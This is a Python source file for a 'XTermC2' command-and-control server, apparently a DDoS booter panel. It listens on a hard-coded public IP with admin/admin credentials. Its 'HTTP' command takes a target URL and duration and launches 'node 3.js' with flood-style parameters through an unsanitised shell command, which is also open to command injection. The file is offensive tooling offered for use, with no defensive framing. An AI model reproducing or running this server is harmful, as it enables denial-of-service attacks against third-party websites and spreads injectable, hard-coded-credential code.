import socket
import os
import subprocess
import sys
import time

USERNAME = "admin"
PASSWORD = "admin"

def avt():
    return '''
    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧⠀
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋⠀
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋⠀⠀⠀
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀⠀⠀⠀⠀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    XTERMC2\n'''
    

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    return b''
def banner():
    return "Welcome to the server!\n"

def xterm():
    return f"XTermC2 ● {USERNAME} => "

def handle_client(client_socket):
    
    client_socket.send(banner().encode())

    client_socket.send("Enter username: ".encode())
    username = client_socket.recv(1024).decode().strip()
    client_socket.send("Enter password: ".encode())
    password = client_socket.recv(1024).decode().strip()

    if username == USERNAME and password == PASSWORD:
        client_socket.send("Login successful!\n".encode())
        client_socket.send(clear())
        client_socket.send(avt().encode())
        
        client_socket.send(xterm().encode())
        while True:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(f"Received command: {data}")

            if data.strip() == "help":
                response = "Available commands: methods, admin\n"
                client_socket.send(f'XTermC2 ● {USERNAME} => '.encode())
            elif data.strip() == "methods":
                response = "Supported methods: HTTP\n"
                client_socket.send(f'XTermC2 ● {USERNAME} => '.encode())
            elif data.strip() == "admin":
                response = "Admin XTerm_BvP\n"
                client_socket.send(f'XTermC2 ● {USERNAME} => '.encode())
            elif data.startswith("HTTP"):
                parts = data.split()
                url = parts[1]
                time = parts[2]
                script_command = f"node 3.js {url} {time} 64 5"
                result = subprocess.run(script_command, shell=True, capture_output=True)
                
                print(f"Script command: {script_command}")
                if result.returncode == 0:
                    response = result.stdout.decode() + "\n"
                    print(f"Script output: {response}")
                else:
                    response = result.stderr.decode() + "\n"
                    print(f"Script error: {response}")
            else:
                response = "Invalid command\n"

            client_socket.send(response.encode())
            
        client_socket.send(xterm().encode())  
    else:
        client_socket.send("Login failed. Connection closed.\n".encode())
        client_socket.close()

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("198.91.81.11", 6777))
    server.listen(5)
    print("[*] Server Hoạt Động")

    while True:
        client_socket, addr = server.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        handle_client(client_socket)

if __name__ == "__main__":
    main()